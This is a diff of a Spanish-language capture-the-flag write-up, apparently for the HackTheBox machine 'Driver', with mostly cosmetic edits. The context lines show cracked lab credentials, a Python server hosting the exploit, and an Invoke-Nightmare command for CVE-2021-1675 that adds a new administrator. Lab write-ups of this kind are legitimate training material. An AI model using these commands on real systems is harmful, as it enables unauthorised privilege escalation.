@@ -17,8 +17,10 @@ tags:
   - MFP Firmware Upload
   - SCF Malicious File
   - Cracking Hash
+  - System Recognition (Windows)
+  - Local Privilege Escalation (LPE)
   - Abusing Vuln Process Spoolsv
-  - PrintNightmare Exploit (CVE-2021-1675)
+  - Privesc - PrintNightmare Exploit (CVE-2021-1675)
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-driver/driver_logo.png)
@@ -66,7 +68,7 @@ Herramientas utilizadas para resolver esta máquina:
 				<ul>
 					<li><a href="#WinPEAS">Utilizando WinPEAS para Encontrar Vulnerabilidades</a></li>
 				</ul>
-				<li><a href="#Exploit">Utilizando Exploit PrintNightmare LPE</a></li>
+				<li><a href="#Exploit">Utilizando Exploit PrintNightmare LPE (PowerShell)</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -204,7 +206,7 @@ Entremos.
 <img src="/assets/images/htb-writeup-driver/Captura1.png">
 </p>
 
-A canijo, pues nos pide una contraseña. Veamos que pasa si no ponemos nada:
+Nos pide una contraseña. Veamos que pasa si no ponemos nada:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-driver/Captura2.png">
@@ -223,8 +225,8 @@ Mmmmm, pues antes de irnos a ver el puerto 445, tratemos de poner credenciales c
 </p>
 
 a... Bueno, el usuario y contraseña que puse, fueron:
-* **User**: admin
-* **Passwd**: admin
+* User: *admin*
+* Passwd: *admin*
 
 Veamos que dice el **Wappalizer**:
 
@@ -379,8 +381,8 @@ Session completed.
 ```
 
 Listo, tenemos las credenciales:
-* **User**: tony
-* **Passwd**: liltony
+* User: *tony*
+* Passwd: *liltony*
 
 Vamos a probar si son correctas para el servidor **SMB** de la máquina víctima usando la herramienta **crackmapexec**:
 ```bash
@@ -527,13 +529,13 @@ Leyendo todo lo que nos sacó el **winPEASx64.exe**, vemos lo siguiente:
 ```
 Existe un Exploit para **spoolsv** llamado **PrintNightmare LPE**, así que vamos a usar este Exploit. Te dejo el link para que lo veas: <a href="https://github.com/calebstewart/CVE-2021-1675" target="_blank">PrintNightmare LPE - CVE-2021-1675</a>
 
-<h2 id="Exploit">Utilizando Exploit PrintNightmare LPE</h2>
+<h2 id="Exploit">Utilizando Exploit PrintNightmare LPE (PowerShell)</h2>
 
 Solamente vamos a ocupar el archivo **.ps1** que viene en el **GitHub**, cópialo en tu máquina con **wget**.
 
 Una vez que lo tengas copiado, vamos a subirlo a la máquina, a través de un **servidor en Python** y en la máquina con **IEX**, hagámoslo por pasos:
 
-* Abre el servidor en Python en donde tengas el Exploit:
+* Abre el servidor en **Python** en donde tengas el Exploit:
 ```bash
 python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -554,7 +556,7 @@ tony
 The command completed with one or more errors.
 ```
 
-* Usamos el código que viene en el GitHub para crear un nuevo usuario administrador:
+* Usamos el código que viene en el **GitHub** para crear un nuevo usuario administrador:
 ```batch
 *Evil-WinRM* PS C:\Windows\Temp\Privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "berserkW" -NewPassword "SuperSecure"
 [+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
@@ -602,7 +604,7 @@ Listo, ya completamos esta máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -612,6 +614,7 @@ Listo, ya completamos esta máquina.
 * https://www.hackplayers.com/2017/11/usando-un-archivo-scf-malicioso-dentro.html
 * https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe
 * https://github.com/calebstewart/CVE-2021-1675
+
 
 <br>
 # FIN
